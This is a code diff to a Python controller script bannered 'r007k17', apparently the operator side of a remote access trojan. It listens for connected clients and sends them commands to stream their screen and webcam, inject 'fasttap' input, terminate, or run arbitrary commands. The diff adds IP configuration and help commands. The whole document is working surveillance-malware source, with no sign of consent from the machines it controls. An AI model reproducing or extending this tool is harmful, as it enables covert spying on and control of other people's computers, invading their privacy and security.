@@ -1,18 +1,72 @@
 import socket
-import os, re
+import os, re, time
 from vidstream import StreamingServer
 from inputimeout import inputimeout, TimeoutOccurred
 import threading
 
+def Ip(data, ipmodify="0"):
+    if data == "modify":
+        ipyou = open("ip.txt", "w")
+        ipyou.write(ipmodify)
+        ipyou.close()
+    if data == "return":
+        try:
+            ipyou = open("ip.txt", "r")
+            ret = (ipyou.readlines())[0]
+            ipyou.close()
+            return ret
+        except:
+            ipyou = open("ip.txt", "w")
+            ipyou.write("nothing")
+            ipyou.close()
+            return "nothing"
+        
 def stopSpaceError(data):
     data = " ".join(re.split(r"\s+", (re.sub(r"^\s+|\s+$", "", data))))
     return data
 
-print("###################################")
-print("##### r007k17 by 7r1574n n13l #####")
-print("###################################")
+def start():
+    global ipToConnect, ipHost, port
+    ipToConnect = str()
+    ipHost = Ip("return")
+    port = 22228
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print("###################################"+"                                                          connect to "+ipHost)
+    print("##### r007k17 by 7r1574n n13l #####")
+    print("###################################"+"                                                          port "+str(port))
 
+start()
+if ipHost == "nothing":
+    Ip("modify", input("write your ip : "))
+    ipHost = Ip("return")
+    start()
 
+def help(data):
+    if data == "command":
+        ligne = None
+        f = open("help.txt", "r")
+        while ligne != "___________________________________________________________________ ":
+            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
+            if ligne != "___________________________________________________________________ " and ligne != " ":
+                print(ligne)
+        f.close()
+    if data == "sending":
+        f = open('help.txt', 'r')
+        NumberOfLine = 0
+        for line in f:
+            NumberOfLine += 1
+        f.close()
+        f = open("help.txt", "r")
+        ligne = None
+        x = 0
+        while ligne != "___________________________________________________________________ ":
+            ligne = (re.compile(r'[\n\r\t]')).sub(" ", f.readline())
+            x += 1
+        count = 0
+        while x < NumberOfLine:
+            print((re.compile(r'[\n\r\t]')).sub(" ", f.readline()))
+            x += 1
+        
 def command(commandToExecute):
     commandToExecute = stopSpaceError(commandToExecute)
     commandToExecuteList = commandToExecute.split()
@@ -32,35 +86,53 @@ def command(commandToExecute):
         elif commandToExecute in ("stop"):
             global progrun
             progrun = False
+        elif commandToExecute in ("help", "aide"):
+            help("command")
+            command(input(">"))
+        elif commandToExecuteList[0] in ("modify", "modifyip"):
+            if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
+                Ip("modify", commandToExecuteList[1])
+                start()
+                print("#                                 #")
+                print("##########  ip modified  ##########")
+                command(input(">"))
+            else:
+                print("no ip write")
+                command(input(">"))
+        elif commandToExecute in ("clear", "cleared", "cls"):
+            start()
+            command(input(">"))
         else:
             print("Error")
             command(input(">"))
     except:
         command(input(">"))
-
+    
 def sendData(data):
-        global run
-        datalist = data.split()
-        if data in ("die", "kill"):
-            client.send("die".encode())
-            run = False
-        elif data in ("left", "quit"):
-            client.send("left".encode())
-            run = False
-        elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
-            client.send("screen".encode())
-        elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
-            screenStop()
-        elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
-            client.send("camera".encode())
-        elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
-            cameraStop()
-        elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
-            datalist.pop(0)
-            data = "fast "+" ".join(datalist)
-            client.send(data.encode())
-        else:
-            client.send(data.encode())
+    global run
+    datalist = data.split()
+    if data in ("die", "kill"):
+        client.send("die".encode())
+        run = False
+    elif data in ("help", "aide"):
+            help("sending")
+    elif data in ("left", "quit", "restart"):
+        client.send("left".encode())
+        run = False
+    elif data in ("screenStart", "screenstart", "screenRun", "sreenrun", "Startscreen", "startscreen", "Runscreen", "runscreen"):
+        client.send("screen".encode())
+    elif data in ("screenStop", "screenstop", "Stopscreen", "stopscreen"):
+        screenStop()
+    elif data in ("cameraStart", "camerastart", "cameraRun", "camerarun", "camStart", "camstart", "camRun", "camrun", "Startcamera", "startcamera", "Runcamera", "runcamera", "Startcam", "startcam", "Runcam", "runcam"):
+        client.send("camera".encode())
+    elif data in ("cameraStop", "camerastop", "camStop", "camstop", "Stopcamera", "stopcamera", "Stopcam", "stopcam"):
+        cameraStop()
+    elif datalist[0] in ("fasttap", "fastTap", "tapfast", "tapFast"):
+        datalist.pop(0)
+        data = "fast "+" ".join(datalist)
+        client.send(data.encode())
+    else:
+        client.send(data.encode())
 
 def getIp():
     serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -120,10 +192,6 @@ def creatClient():
             print("can't connect to "+ip)
         except:
             print("ip isn't allowed")
-    
-ipToConnect = str()
-ipHost = "172.17.1.214"
-port = 22228
 
 progrun = True
 
